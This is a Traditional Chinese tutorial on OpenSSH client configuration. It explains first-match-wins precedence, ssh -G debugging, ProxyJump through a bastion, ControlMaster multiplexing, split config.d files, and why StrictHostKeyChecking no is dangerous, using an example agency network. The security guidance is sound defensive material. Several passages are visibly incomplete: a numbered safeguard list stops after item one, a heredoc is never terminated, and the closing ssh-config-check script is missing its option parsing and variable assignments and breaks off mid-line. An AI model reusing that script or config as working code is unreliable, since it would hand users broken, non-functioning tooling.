# SSH 客戶端設定檔

> [!abstract] 這篇你會學到
> - **★★★★★ ssh_config 是「第一個出現的值勝出」** —— `Host *` 放錯位置會讓整份檔案的行為
>   跟你想的完全相反，本篇用一個可重現的例子證明給你看
> - **★★★★ `ssh -G <別名>` 是唯一的真相來源**，改完 config 先跑它再連線
> - 用 **ProxyJump** 一行連進三層網段，**★★★★ 而且不用把私鑰放到跳板機上**
> - 用 **ControlMaster** 讓第二次連線與 `scp` / `rsync` 快到瞬間完成，**★★★ 並學會辨識
>   「舊 socket 還活著所以改了 config 卻毫無反應」**
> - 用 `Include ~/.ssh/config.d/*.conf` 版控交接，**★★★ 並知道哪些欄位不能進 repo**
> - 寫出 `ssh-config-check` 驗證腳本，讓「改壞設定把自己鎖在外面」不會發生

## 觀念說明

### 這份檔案解決什麼問題

```text
★★ 沒有 ~/.ssh/config 的日常（機關內網三層架構）
  $ ssh -i ~/.ssh/id_ed25519_prod -p 22022 opsadmin@203.0.113.10   # ★ 先上跳板機
  bastion$ ssh -i ~/.ssh/id_ed25519_prod -p 2222 deploy@10.10.20.11
                ^^^^^^^^^^^^^^^^^^^^^^^^ ★★★★ 代表【私鑰被複製到跳板機上了】
                                         → 跳板機被攻破 = 內網所有機器一起淪陷
★★★★ 有 config 之後只要 $ ssh web01 —— 自動走跳板、自動用對的金鑰與 port，
     ★★★★ 私鑰從頭到尾只在你的筆電上。
```

一句話：**`~/.ssh/config` 是把維運知識從腦袋跟便利貼搬到一份可版控檔案的地方。** 它不只省打字，它是**資產清冊**與**交接文件**。

### ★★★★★ 最重要的一件事：第一個匹配值勝出

`man 5 ssh_config` 開宗明義：*Unless noted otherwise, for each parameter, the first obtained
value will be used. ... more host-specific declarations should be given near the beginning of the file, and general defaults at the end.*

```text
★★★★★ ssh 從上往下讀，把【所有】符合的 Host / Match 區塊都套用一遍，但是 ——
    ✗ 【不是】後面蓋掉前面   ← ★★★★★ 大多數設定檔是這樣（Nginx、sshd_config、php.ini）
    ✓ 【是】某參數第一次被設定後就【鎖死】，後面再寫都無效
  所以：★★★★★「Host * 的共用設定一定要放在檔案【最後面】」、
       ★★★★「越 specific 的 Host 越要放前面」。
  ★★★ 記憶法：像防火牆規則（第一條 match 就結束），不是 CSS。
```

以下兩份 config **內容完全一樣，只差區塊順序**：

```bash
$ cat > /tmp/bad.conf <<'EOF'
Host *
    User deploy
Host web01
    HostName 10.10.20.11
    User ubuntu
    Port 2222
EOF
$ ssh -F /tmp/bad.conf -G web01 | grep -E '^(user|hostname|port) '
user deploy          # ★★★★★ 不是 ubuntu！Host * 先設了 User，web01 的 User 完全被忽略
hostname 10.10.20.11 # ★★ HostName 只有 web01 設，所以生效
port 2222            # ★★ Port 同理
#   把 Host * 那一段移到檔案最後再跑一次，user 就變成 ubuntu（★★★★ 這次對了）
```

> [!danger] 這個錯誤在機關環境的後果 ★★★★★
> ```text
> 資深同仁在 config 最上面加了 Host * / User root（★★★★「反正我都用 root」）
> 與 StrictHostKeyChecking no（★★★★★ 見安全性章節），新同仁在下面加
> Host web01 / User deploy → ★★★★★ 永遠不會生效。
> ① ★★★★ 全部 ssh 都用 root → 稽核軌跡全是 root，機關資安稽核
>    「特權帳號使用紀錄」直接掛掉
> ② ★★★ 新同仁 debug 兩小時，因為「我明明寫了 User deploy」
> ③ ★★★★ 若 Host * 先指定了 IdentityFile，所有機器都拿那把去試，log 全是認證失敗
> ```

### ★★★★ 設定的三層優先序

```text
  ① 命令列  ssh -o User=root / -p 2222 / -i key   ← ★★★★ 最高，永遠贏
  ② ~/.ssh/config          （你自己的）            ← ★★★ 日常戰場
  ③ /etc/ssh/ssh_config    （全機器共用）          ← ★★ 通常別動
     └ Debian/Ubuntu 在最前面 Include /etc/ssh/ssh_config.d/*.conf
  ★★★★ 因為「先讀到的贏」，③ 幾乎不可能蓋掉 ② —— 但 /etc/ssh/ssh_config.d/ 的內容會
        【比 /etc/ssh/ssh_config 早讀到】（★★★ Ubuntu 套件、企業 MDM、TWGCB 基準腳本
        常放這）。排查「明明沒設卻生效」記得 ls -l 這個目錄。
  ★★★ 例外：ssh -F <檔案>【完全取代】② 與 ③ —— 這是測試新設定最安全的方式。
```

## 基礎設定

### 建立檔案與 ★★★★ 權限

```bash
$ mkdir -p ~/.ssh && chmod 700 ~/.ssh
$ touch ~/.ssh/config && chmod 600 ~/.ssh/config      # ★★★★ 這行不能少
$ ls -l ~/.ssh/config
-rw------- 1 opsadmin opsadmin 0 Aug 28 09:12 /home/opsadmin/.ssh/config
#  ^^^^^^^ ★★★★ 重點是【group / other 不可寫】
```

> [!warning] 權限不對時 ssh 直接罷工 ★★★★
> ```text
> Bad owner or permissions on /home/opsadmin/.ssh/config
> ```
> ```text
> ★★★★ 這是【硬性拒絕】不是警告 —— ssh 直接退出，連都不連。觸發條件（滿足任一）：
>   ① ★★★ group 或 other 有【寫入】權限（664、666、777）；② ★★★★ 擁有者不是你
>      （★★★ 最常見：用 sudo vim 編輯後 owner 變 root）
> ★★ 644 是【可以】的（other 只能讀），但實務一律用 600 —— config 裡有跳板機外網 IP 與
>    帳號，那是攻擊者的偵察情報。修法：
> $ sudo chown "$USER:$USER" ~/.ssh/config && chmod 600 ~/.ssh/config
> ```

### 最小可用的一份 config

```bash
$ cat > ~/.ssh/config <<'EOF'
# ---- 特定主機（越 specific 越前面）----
Host web01
    HostName 10.10.20.11
    User deploy
    Port 2222
    IdentityFile ~/.ssh/id_ed25519_prod
    IdentitiesOnly yes
# ---- 共用預設（★★★★ 一定放最後）----
Host *
    AddKeysToAgent yes
    ServerAliveInterval 30
    ServerAliveCountMax 3
EOF
$ chmod 600 ~/.ssh/config
$ ssh -G web01 | grep -E '^(hostname|user|port|identitiesonly|identityfile ~)'
user deploy
hostname 10.10.20.11
port 2222
identitiesonly yes
identityfile ~/.ssh/id_ed25519_prod
```

### ★★★★ `ssh -G` —— 所有 config 問題的第一動作

`ssh -G <目的地>` **套用完 Host 與 Match 之後，把最終生效的設定印出來然後退出**（不連線、
不動任何東西，**★★★ 完全安全，可以隨便跑**）。

```bash
$ ssh -G web01 | awk '$1 ~ /^(hostname|user|port|proxyjump)$/ {print $1"="$2}'  # ① 關鍵欄位
$ diff <(ssh -G web01) <(ssh -G web02)                                          # ② 比較兩台
$ ssh -G -o User=root web01 | grep '^user '                                     # ③ 驗證 -o 優先
user root        # ★★★★ 命令列贏，證實優先序第一層
```

> [!tip] `ssh -G` 的三個陷阱 ★★★
> ```text
> ① ★★★★ 別名打錯【不會報錯】：$ ssh -G nosuchhost | grep '^hostname'
>    hostname nosuchhost          ← ★★★★ hostname 竟然等於別名本身
>    ★★★★ 法則：hostname 跟你打的別名一模一樣 = 【沒有任何 Host 區塊匹配到】。
> ② ★★ 輸出順序是固定內部排序，不要拿它推論「誰先誰後」（那要看 ssh -vvv）。
> ③ ★★★ IdentityFile 一定會列出五個「預設候選」（id_rsa、id_ecdsa…），這是內建
>    預設不代表你設錯；設了 IdentitiesOnly yes 之後它們還是會印但不會被拿去試。
> ```

### ★★★ `ssh -vvv`：看解析的每一步

`ssh -G` 告訴你「結果是什麼」，`ssh -vvv` 告訴你「**為什麼**」：

```bash
$ ssh -vvv -o ConnectTimeout=3 web01 true 2>&1 \
    | grep -E 'Reading configuration|Including file|Applying options'
debug1: Reading configuration data /home/opsadmin/.ssh/config
debug3: /home/opsadmin/.ssh/config line 1: Including file .../config.d/10-bastion.conf depth 0
debug1: /home/opsadmin/.ssh/config.d/20-prod.conf line 1: Applying options for web01
debug1: /home/opsadmin/.ssh/config.d/90-defaults.conf line 1: Applying options for *
```

★★★★ 「Applying options for X」按**實際套用順序**列出所有匹配到的區塊。排查「設定沒生效」時，看的就是：我期望的區塊，是不是排在別人後面？

### Host 的比對語法

```bash
Host web01 web02 web03         # ★ 一個區塊掛多個別名（空白分隔）
Host *.internal.gov.tw         # ★★ * = 任意長度任意字元
Host web0?                     # ★★ ? = 剛好一個字元（web01~web09，不含 web10）
Host *.gov.tw !legacy.gov.tw   # ★★★ ! 排除：命中任一 ! 樣式就【整個區塊跳過】
```

> [!warning] Host 比對的是「你打的字」，不是 HostName ★★★★
> ```text
> Host web01
>     HostName 10.10.20.11
> Host 10.10.*                # ★★★★ 這個區塊【不會】對 web01 生效
>     IdentityFile ~/.ssh/id_prod
> ★★★★ Host 比對的是 originalhost —— 你在命令列輸入的那個字串。你打 ssh web01，
>       比對的就是 web01，跟它解析成什麼 IP 無關。
> ★★★ 要用解析後的 HostName 比對，必須改用 Match host（見進階章節）。
> ```

### 核心設定項

| 設定項 | 作用 | 為什麼你會需要它 |
| --- | --- | --- |
| `HostName` / `Port` / `User` ★★★ | 真正要連的位址、port、帳號 | 別名與位址脫鉤；**★★★ 機關稽核要求一人一帳號，不要用 root** |
| `IdentityFile` ★★★ | 指定私鑰 | 一環境一把 |
| `IdentitiesOnly yes` ★★★★ | **只用指定的金鑰** | 見下方專門說明 |
| `AddKeysToAgent yes` / `ForwardAgent no` ★★★★ | 自動入 agent / 關閉 agent 轉發 | 一天只輸入一次 passphrase；**★★★★ ForwardAgent 不要開**（見安全章節） |
| `StrictHostKeyChecking` ★★★★ | 主機金鑰驗證政策 | `ask` / `accept-new` / **`no`（禁用）** |
| `UserKnownHostsFile` ★★★ | known_hosts 位置 | **★★★★ 不要指到 /dev/null** |
| `ConnectTimeout` / `BatchMode` ★★★ | 逾時 / 不互動 | **腳本裡一定要設**，否則卡死 |
| `LogLevel` / `RequestTTY` ★★ | 輸出詳細度 / 終端機 | `ERROR` 壓掉 banner；`force` 讓 `ssh host top` 正常 |
| `HostKeyAlias` / `Compression` ★★★ | known_hosts 用的名字 / 壓縮 | 一機多 IP 避免重複驗證；**★★ 壓縮只在很慢的線路開** |

#### ★★★★ `IdentitiesOnly yes` 是必設項

```bash
$ ssh -vvv web01 2>&1 | grep -c 'Offering public key'
8        # ★★★★ 沒設 IdentitiesOnly：agent 裡每一把 + 五個預設路徑，全部送出去試
#   ★★★★ 兩個後果：
#   ① 【被鎖帳號】sshd 預設 MaxAuthTries 6 → 試到第 6 把就被踢掉，★★★★ 即使正確的
#      那把是第 7 把。你會看到 Too many authentication failures，而且你【百分之百
#      確定金鑰是對的】—— 這個坑非常難自己想通。
#   ② 【資訊外洩】★★★ 你把所有金鑰的公鑰指紋送給了對方伺服器。
#   ★★★★ 解法就一行：IdentitiesOnly yes
```

```text
★★★★ 四道保險（順序就是操作順序）
  ① ★★★★【保留一條既有連線不要關】整個修改過程都不要動它，改壞了還有這條路可以救。

```

```bash
$ ssh -G web01 >/dev/null && echo "語法 OK" || echo "★★★★ 設定檔有語法錯誤"
```

## 進階設定與調校

### Host 與 Match 的分工

`Host` 只比 **originalhost**（命令列打的字串）；`Match` 的條件多得多：

| 條件 | 意義 | 星級 |
| --- | --- | --- |
| `originalhost` / `host` / `user` / `localuser` | 命令列打的字串 / **解析後的 HostName** / 遠端 / **本機**使用者 | ★★★ |
| `exec "cmd"` | 執行指令，離開碼 0 就算符合 | ★★★★ |
| `tagged <name>` | 前面用 `Tag` 標記過的（**OpenSSH 9.4+**） | ★★★ |
| `final` / `canonical` / `all` | 全部解析完再跑一輪 / 正規化後 / 永遠符合 | ★★★ |

```bash
$ cat > /tmp/m.conf <<'EOF'
Host web01
    HostName 10.10.20.11
    User deploy
Match host 10.10.* !host 10.10.99.*
    IdentityFile ~/.ssh/id_ed25519_prod
    IdentitiesOnly yes
EOF
$ ssh -F /tmp/m.conf -G web01 | grep -E '^(hostname|identitiesonly|identityfile ~)'
hostname 10.10.20.11
identitiesonly yes
identityfile ~/.ssh/id_ed25519_prod    # ★★★ Match host 命中 10.10.*
```

★★★ `Match host` 要生效有**第二個條件**：必須排在「設定了 `HostName` 的那個 `Host` 區塊」之後，否則解析到 `Match` 時 `%h` 還是別名，一樣比不到。

★★★★ **`Match exec` 的三個注意事項**：① 每次 ssh 都會執行一次 → ★★★ 不要在裡面 curl 外部網站；② ★★★★★ 它用 `/bin/sh` 執行且 ssh 不做跳脫 —— 等於把 shell 權限交給這份 config，
**絕對不要** Include 別人給的 config（見安全章節）；③ ★★「第一個值勝出」讓你無法「刪掉」
已設定的值，只能設成 `none`（`Match exec "ip route get 10.10.20.11 >/dev/null 2>&1"`底下寫 `ProxyJump none`，★★ 在辦公室內網時取消跳板）。

```bash
Host web01 web02 db01
    Tag prod                       # ★★★ OpenSSH 9.4+：用標籤取代一長串主機名
Match tagged prod
    User deploy
    IdentityFile ~/.ssh/id_ed25519_prod
    IdentitiesOnly yes
#   $ ssh -G web01 | grep -E '^(user|tag)'  →  user deploy / tag prod
#   ★★★ 價值：新增一台正式機只要寫兩行（Host web09 / Tag prod），金鑰、帳號、log 等級
#        全部自動套用。★★ Ubuntu 22.04（8.9）、RHEL 8/9（8.7）沒有，★★★ 要相容就退回
#        樣式命名（web-prod-01 + Host *-prod-*）。
```

### ★★★★ ProxyJump：連進內網而不把私鑰交出去

```bash
$ ssh -J opsadmin@203.0.113.10:22022 deploy@10.10.20.11   # 命令列
$ ssh -J bastion-dmz,bastion-int web01                     # ★★ 多層，逗號分隔、由外而內
# 寫進 config 之後只要 $ ssh web01：
Host bastion
    HostName 203.0.113.10
    User opsadmin
    Port 22022
    IdentityFile ~/.ssh/id_ed25519_bastion
    IdentitiesOnly yes
Host web01
    HostName 10.10.20.11
    User deploy
    ProxyJump bastion          # ★★★ 填【別名】，上面那些設定會自動套用
```

#### ★★★★★ 為什麼跳板機上不需要放你的私鑰

```text
【錯誤做法】筆電 ──ssh──▶ 跳板機 ──ssh──▶ web01
              ▲ ★★★★★ 私鑰必須複製到跳板機上。它是【對外開放】、最常被攻擊的機器，
                一旦淪陷 → 內網所有機器的鑰匙一起被拿走。

【ProxyJump】兩層加密通道套疊，私鑰只留在筆電
  ┌─ 你的筆電 ────────────────────────────────────────────────────────┐
  │ 內層：你 ◀══ SSH 加密 ══▶ web01  ← ★★★★ 用 id_ed25519_prod 在筆電上簽章  │
  │       （web01 的主機金鑰驗證也在這層做）                                 │
  │           ↓ 內層封包被當成「純資料」塞進外層                             │
  │ 外層：你 ◀══ SSH 加密 ══▶ 跳板機 ← ★★ 用 id_ed25519_bastion             │
  └────────────────────┬──────────────────────────────────────────────┘
                       ▼ 外層在跳板機解開
       跳板機（跑 ssh -W %h:%p）── 純 TCP ──▶ web01
       ★★★★ 它只看到「一坨加密的 TCP 位元組」，【解不開】內層，
       ★★★★★ 也沒有你的任何私鑰。
  ★★★★ 一句話：跳板機是【水管】不是【中繼站】：轉發位元組，不參與認證。
```

```bash
$ ssh -vvv -o ConnectTimeout=3 web01 true 2>&1 | grep 'Executing proxy command'
debug1: Executing proxy command: exec ssh -vvv -W '[10.10.20.11]:22' bastion
#   ★★★★ ssh -W host:port =「把 stdin/stdout 接到遠端的這個 TCP port」，
#        跳板機上跑的是這個，不是一個新的登入 shell
```

| 寫法 | OpenSSH | 備註 |
| --- | --- | --- |
| `ProxyJump bastion` / `a,b,c` / `none` ★★★★ | **7.3+**（2016） | 現代寫法；多層由外而內；`none` 取消繼承來的跳板 |
| `ProxyCommand ssh -W %h:%p bastion` ★★ | 5.4+ | **舊版相容寫法**，效果幾乎相同（★★★ 更古老的 `nc %h %p` 需跳板機裝 nc 且無法優雅關閉，**不要用**） |

> [!warning] ProxyJump 的兩個常見誤解 ★★★
> ① ★★★「命令列的 `-o` 會套用到跳板機」→ **錯**。`ssh -o User=root -J bastion web01` 的
> `-o` 只作用在**最終目的地**（man：*configuration directives supplied on the command-line
> generally apply to the destination host and not any specified jump hosts*）。★★★ 要設
> 跳板機參數就寫進 config，或用 `-J user@host:port` 完整形式。② ★★「web01 的 known_hosts
> 要放在跳板機上」→ **錯**。★★★ web01 的主機金鑰驗證是在**你的筆電**上做的。

### ★★★ ControlMaster：連線複用

```bash
$ mkdir -p ~/.ssh/cm && chmod 700 ~/.ssh/cm   # ★★★ socket 被別人存取等於連線被劫持
# 寫在 Host * 區塊（★★★★ 檔案最後面）：
#   ControlMaster auto / ControlPath ~/.ssh/cm/%C / ControlPersist 10m
$ time ssh web01 true ; time ssh web01 true    # 第一次完整建線；第二次複用
real    0m1.842s           # ★★ 含跳板機那一跳
real    0m0.038s           # ★★★★ 快了 45 倍
$ ssh -O check web01
Master running (pid=48213)
$ ssh -O exit web01        # ★★★★ 改完 config／收工時關掉
Exit request sent.
$ ssh -O check web01       # ★★ 沒有 master 時（正常現象，不用處理）
Control socket connect(/home/opsadmin/.ssh/cm/870b88d7...): No such file or directory
```

`ssh -O` 的子指令：`check`（★★★ 確認 master 在不在）、`exit`（★★★★ **關閉 master 與所有
複用工作階段**）、`stop`（★★ 停收新的複用但保留現有）、`forward` / `cancel`（★★ 動態增減埠轉發，見 [[020-02-01-05-cmd-SSH-隧道與埠轉發]]）。

#### ★★★ 為什麼 ControlPath 一定要用 `%C`

```bash
$ ssh -o 'ControlPath=~/.ssh/controlmasters/%r@%h:%p-longsuffix...' -O check web01
ControlPath too long ('/home/opsadmin/.ssh/controlmasters/deploy@some.long.fqdn...' >= 108 bytes)
#   ★★★★ 原因：ControlPath 是 UNIX domain socket，Linux 的 sun_path 上限硬性 108 bytes。
#        %r@%h:%p 展開後長度不固定，FQDN 長一點、家目錄深一點就爆，★★★ 而且
#        【只在特定主機上爆】，非常難重現。
$ ssh -G web01 | grep '^controlpath'      # ★★★ 解法：%C 是 (%l %h %p %r %j) 的雜湊
controlpath /home/opsadmin/.ssh/cm/870b88d70468db1aec77e680e51f07854ae36564
#   ★★ 永遠固定 40 個十六進位字元，OpenSSH 6.7（2014）起支援。
#   ★★★ 附帶好處：socket 檔名看不出你連了哪台機器。
```

#### ★★★★ 最大的陷阱：舊 socket 讓新設定完全不生效

```text
★★★★ 症狀（幾乎每個用 ControlPersist 的人都會遇到一次）：你改了 User / IdentityFile /
  Port / ProxyJump，$ ssh -G web01 顯示【新的】設定看起來完全正確，但 $ ssh web01
  進去之後還是【舊的】行為。
  原因：ControlPersist 讓一個 master 在背景活著。你的新連線【根本沒有建立新連線】，只是
  接上那個用【改設定之前的參數】建立的 socket。★★★★ User、Port、IdentityFile、
  ProxyJump 這些【建線期】參數，在複用連線上完全無效。
  ★★★★ 除錯 SOP 第一步永遠是 ssh -O exit web01。★★★ 不確定有哪些 master 時：
  $ ls -l ~/.ssh/cm/ 然後 rm -f ~/.ssh/cm/*（★★ 會讓現有工作階段失去 master）
```

> [!tip] ControlMaster 與 scp / rsync / git / Ansible ★★★
> ★★★ 只要走同一個 ssh 別名，這些工具全部自動吃到複用：`scp report.csv web01:/tmp/`（★ 幾乎
> 瞬間）、`rsync -avz ./dist/ web01:/var/www/`（★★ 見 [[060-01-06-02-guide-rsync-同步與備份]]）、
> `git push production main`（★★ 走 ssh 的 remote）。★★★ 對 Ansible 特別有感 —— 每個 task
> 都開一次 ssh，開了複用後 playbook 常常砍半。★★★★ 但也因此：playbook 跑到一半你去
> `ssh -O exit`，會整批失敗。

> [!danger] ControlPath 放錯位置會被劫持 ★★★★
> ★★★★ socket 的意義是「誰能連上它，誰就能用你已認證的連線」。✗ `/tmp/ssh-%C`、
> `/dev/shm/%C`（★★★★ 所有人可寫）；✓ `~/.ssh/cm/%C`（★★★ 家目錄配 `chmod 700`）；
> ✓ `/run/user/%i/ssh/%C`（★★★ 更好：tmpfs、開機清空、只有該 uid 能進 —— ★★ 記得先
> `mkdir -p /run/user/$(id -u)/ssh`）。

### 連線穩定性三兄弟

```text
★★★★ 三個名字很像、層級完全不同的機制
  ServerAliveInterval / CountMax  ★★★★【你（客戶端）在數】→ ~/.ssh/config。每 N 秒送
    一個【SSH 層】的加密探測，連續 M 次沒回應就自己斷開並報錯。
  ClientAliveInterval  ★★【對方（sshd）在數】→ sshd_config。目的是【清掉殭屍工作
    階段】，不是幫你維持連線。見 [[020-02-01-04-svc-sshd-伺服器端設定]]。
  TCPKeepAlive  ★★【核心在數】→ OS 的 TCP 層。★★★ Linux 預設 7200 秒（2 小時）才送
    第一個，對「閒置 5 分鐘就斷」完全沒用，而且不加密。
★★★★ 「機關 NAT／防火牆閒置 5 分鐘斷線」該調哪一個？答：ServerAliveInterval。
  ① 它是【你能控制的】，不用求伺服器管理員改設定；② 它送的是【SSH 層】封包，NAT／
  狀態防火牆看到有實際流量會重置閒置計時器（★★ TCPKeepAlive 的空 ACK 有些設備【不算】
  流量）；③ ★★★ 設 30 秒遠小於 5 分鐘閾值：Host * 底下寫 ServerAliveInterval 30 /
  ServerAliveCountMax 3 / TCPKeepAlive yes。
★★★ 取捨：Interval < 10s 只是多送封包；CountMax > 5 線路真斷了你要等很久。
    ★★★ 長時間的工作不要靠 keepalive 硬撐，用 [[060-01-05-01-guide-tmux-工作階段管理]]。
```

### Include 與 config.d 分檔管理

```bash
$ mkdir -p ~/.ssh/config.d && chmod 700 ~/.ssh/config.d
$ printf 'Include ~/.ssh/config.d/*.conf\n' > ~/.ssh/config && chmod 600 ~/.ssh/config
$ ssh -vvv -o ConnectTimeout=1 web01 true 2>&1 | grep -E 'Including file|Applying options'
debug3: .../.ssh/config line 1: Including file .../config.d/10-bastion.conf depth 0
debug3: .../.ssh/config line 1: Including file .../config.d/20-prod.conf depth 0
debug1: .../config.d/20-prod.conf line 1: Applying options for web01
debug1: .../config.d/90-defaults.conf line 1: Applying options for *
```

★★★★ **Include 的三個規則**：① 展開順序 =【glob 的字典序】→ ★★★★ 檔名前綴的數字**就是優先序**，必須讓 `Host *` 那份排最後（`90-` 或 `99-`）；② ★★★ Include 的內容等於被**貼在
那一行的位置**，所以要放在主檔最上面；③ ★★★ 可寫在 `Host` / `Match` 區塊裡條件式載入。

#### ★★★★ 哪些內容不能進公開 repo

| 內容 | 內部私有 repo | 公開 repo | 理由 |
| --- | --- | --- | --- |
| 內網 IP、非標準 SSH port ★★★ | ✅ | ❌ | 洩漏內網拓撲、讓「改 port」防線失效 |
| **跳板機外網 IP / FQDN** ★★★★ | ✅ | **❌ 絕對不行** | 等於公告「打這台就能進內網」 |
| 帳號名稱、`IdentityFile` 路徑 ★★★ | ✅ | ❌ | 有效帳號名＝暴力破解成功一半；路徑透露命名規則 |
| **私鑰本身** ★★★★★ | ❌ | ❌ | **這是資安事件，不解釋** |

★★★★ 判斷準則：「這份檔案外流到網路上，我要不要通報資安事件？」會 → 不進 repo。`.gitignore` 至少要有 `80-local.conf` / `*.local.conf` / `id_*` / `known_hosts*` / `*.bak`。

### Token 替換

| Token | 展開為 | 常用在 | 星級 |
| --- | --- | --- | --- |
| `%h` | **HostName**（解析後） | `ProxyCommand`、`ControlPath` | ★★★ |
| `%n` / `%p` | **originalhost**（你打的別名） / Port | `LocalCommand`；`ssh -W %h:%p` | ★★★ |
| `%r` / `%u` / `%i` / `%d` | 遠端使用者 / 本機使用者 / 本機 UID / 家目錄 | `/run/user/%i/ssh/%C` | ★★★ |
| `%C` | `%l%h%p%r%j` 的雜湊（40 hex） | **`ControlPath` 首選** | ★★★★ |

★★★★ **`%h` 與 `%n` 的差別是考題也是實務陷阱**：`ProxyCommand ssh -W %h:%p bastion` 的
`%h` = `10.10.20.11`（對）；寫成 `%n` 則是 `web01`，★★★ 跳板機上查不到（`ssh: Could not
resolve hostname web01`）。★★★ `ProxyCommand` / `ProxyJump` 一律用 `%h`。

### ★★★★ 反面教材：`StrictHostKeyChecking no`

```text
★★★★★ 本篇唯一明確標示【正式環境禁止】的東西：Host * 底下寫
   StrictHostKeyChecking no（★★★★ 不驗證主機金鑰）
   UserKnownHostsFile /dev/null（★★★★ 驗證結果丟掉，不留紀錄）
 ★★★ 為什麼有人這樣寫？因為每次重灌測試機都要手動確認指紋，很煩。★★★★ 但這等於把
     [[020-02-01-01-cmd-SSH-原理與第一次連線]] 建立的主機驗證機制整個丟掉。
 ★★★★★ 實際後果：你 ◀──▶ 攻擊者（ARP 欺騙／DNS 劫持）◀──▶ web01 —— 他冒充 web01 的
     主機金鑰，你的 ssh【一聲不吭】接受，你輸入的 sudo 密碼、DB 密碼、agent 簽章請求
     他全部看到。★★★★ 而 known_hosts 指到 /dev/null，事後【連查都查不出來】——
     稽核軌跡歸零。
```

| 值 | 行為 | 適用 | 星級 |
| --- | --- | --- | --- |
| `ask` | 沒看過的問你，變更的**拒絕** | **預設值，最安全** | ★★★★ |
| `accept-new` | 沒看過的**自動接受**，變更的**仍然拒絕** | **★★★★ 自動化的正解**（7.6+） | ★★★★ |
| `no` / `off` | 沒看過的接受，**變更的也接受** | **★★★★ 正式環境禁止** | ★★★★★ |
| `yes` | **一律拒絕**沒在 known_hosts 裡的 | 需事先佈署 known_hosts | ★★★ |

★★★★ **`accept-new` 為什麼安全得多**？真正的攻擊場景是「一台你**已經連過**的機器，金鑰
突然變了」—— `accept-new` 會拒絕並跳出巨大警告，`no` 則靜靜地接受。★★ 唯一可接受 `no`
的場景（三條件同時成立）：① 拋棄式測試機（Vagrant / VM / CI runner）；② ★★★ 限定在
**專用 `Host` 區塊**不是 `Host *`；③ ★★★ `UserKnownHostsFile` 指到專用檔案
（`~/.ssh/known_hosts_throwaway`），至少留得下紀錄。

## 完整實戰範例

### 情境

某機關資訊室要把 SSH 連線方式標準化並交接給新進同仁：

```text
  維運人員筆電（★★★★ 私鑰只存在這裡）──SSH 22022──▶ DMZ bastion 203.0.113.10:22022
                                              （opsadmin，★★★★ 唯一對外開放，只做轉發）
       ┌──────────────┬────────────┬───────────┴──┐
       ▼              ▼            ▼              ▼
  web01 10.10.20.11  web02 .12   db01 10.10.30.21  mon01 10.10.40.5
   :2222 deploy      :2222 deploy  :22 dbadmin       :22 monitor
  ★★★ 目標：一份可版控、可交接的 ~/.ssh/config，私鑰全程不離開筆電。
```

### 步驟一～三：骨架、跳板機、正式環境

```bash
$ mkdir -p ~/.ssh/config.d ~/.ssh/cm && chmod 700 ~/.ssh ~/.ssh/config.d ~/.ssh/cm
$ cat > ~/.ssh/config <<'EOF'
#  SSH 客戶端主設定 — 資訊室維運標準組態    維護：維運組   更新：2026-08-28
#  ★★★★ 本檔只做一件事：include config.d。所有設定都在 config.d/ 裡，
#        檔名數字前綴 = 套用優先序（小的先）。
Include ~/.ssh/config.d/*.conf
EOF
$ cat > ~/.ssh/config.d/10-bastion.conf <<'EOF'
# 10-bastion.conf — DMZ 跳板機
# ★★★★ 含【對外 IP 與非標準 port】，僅限內部私有 repo
Host bastion bastion.dmz
    HostName        203.0.113.10
    User            opsadmin
    Port            22022
    IdentityFile    ~/.ssh/id_ed25519_bastion
    IdentitiesOnly  yes
    ForwardAgent    no                # ★★★★ 跳板機是最不該轉發 agent 的地方
    ServerAliveInterval 20            # ★★★ 跳板機閒置久，探測間隔短一點
    ServerAliveCountMax 3
EOF
$ cat > ~/.ssh/config.d/20-prod.conf <<'EOF'
# 20-prod.conf — 正式環境主機清單（★★★ 這就是資產清冊，異動要 code review）
Host web01
    HostName 10.10.20.11
    User     deploy
    Port     2222
    ProxyJump bastion
Host web02
    HostName 10.10.20.12
    User     deploy
    Port     2222
    ProxyJump bastion
Host db01
    HostName 10.10.30.21
    User     dbadmin
    ProxyJump bastion
    LocalForward 13306 127.0.0.1:3306   # ★★★ DBeaver 直接接 127.0.0.1:13306
# ---- 正式環境共用（★★★ 放在具體主機【之後】、Host * 【之前】）----
Host web0? db0?
    IdentityFile   ~/.ssh/id_ed25519_prod
    IdentitiesOnly yes
    ForwardAgent   no                 # ★★★★ 正式機一律不轉發 agent
    LogLevel       INFO
EOF
$ chmod 600 ~/.ssh/config ~/.ssh/config.d/*.conf
```

### 步驟四：`90-defaults.conf`（★★★★★ 必須字典序最後）

```bash
$ cat > ~/.ssh/config.d/90-defaults.conf <<'EOF'
# 90-defaults.conf — 全域預設
# ★★★★★ 這個檔案【必須是字典序最後一個】。因為 ssh_config 是「第一個值勝出」，
#        Host * 一旦排在前面，底下每個參數都會鎖死，所有具體主機的設定通通失效。
#        ★★★★ 新增檔案時前綴不要超過 90。
Host *
    StrictHostKeyChecking   accept-new   # ★★★★ 絕不設成 no
    UserKnownHostsFile      ~/.ssh/known_hosts
    HashKnownHosts          yes
    AddKeysToAgent          yes
```

### ★★★★ 驗證腳本 `/usr/local/bin/ssh-config-check`

```bash

# ssh-config-check — 驗證每個別名解析成預期值，並實測連通
#   用法：ssh-config-check [-e 期望值檔] [-n]（-n = 只驗設定不連線）

die(){ echo "[FATAL] $*" >&2; exit 3; }; ok(){ echo "  [ OK ] $*"; }
bad(){ echo "  [FAIL] $*"; };            warn(){ echo "  [WARN] $*"; }
sect(){ printf '\n=== %s ===\n' "$*"; }

    *) die "未知選項 -$OPTARG";; esac; done

command -v ssh >/dev/null || die "找不到 ssh"; ok "$(ssh -V 2>&1)"
test -f "$HOME/.ssh/config" || die "找不到 $HOME/.ssh/config"

if   test "$ow" != "$(id -un)"; then
     bad "config 擁有者是 $ow → sudo chown $(id -un):$(id -gn) ~/.ssh/config"; FC=1
elif test "$pm" != "600" -a "$pm" != "400" -a "$pm" != "644"; then
     bad "config 權限 $pm 不安全 → chmod 600 ~/.ssh/config"; FC=1
else ok "config 權限 $pm、擁有者 $ow"; fi

  && warn "有 ControlMaster socket 存活 —— 剛改過 config 請先 ssh -O exit <別名>"

test -f "$EXPECT" || die "找不到期望值檔 $EXPECT（用 -e 指定）"
while read -r a eh eu ep ej; do
    test -n "${a:-}" || continue; case "$a" in \#*) continue;; esac
    got=$(ssh -G "$a" 2>/dev/null) || { bad "$a：ssh -G 失敗"; FC=1; continue; }
    f(){ printf '%s\n' "$got" | awk -v k="$1" '$1==k{print $2; exit}'; }

    test "$gh" = "$a" -a "$eh" != "$a" \
      && { bad "$a：hostname 等於別名本身 → 沒有 Host 區塊匹配（拼字或大小寫錯）"
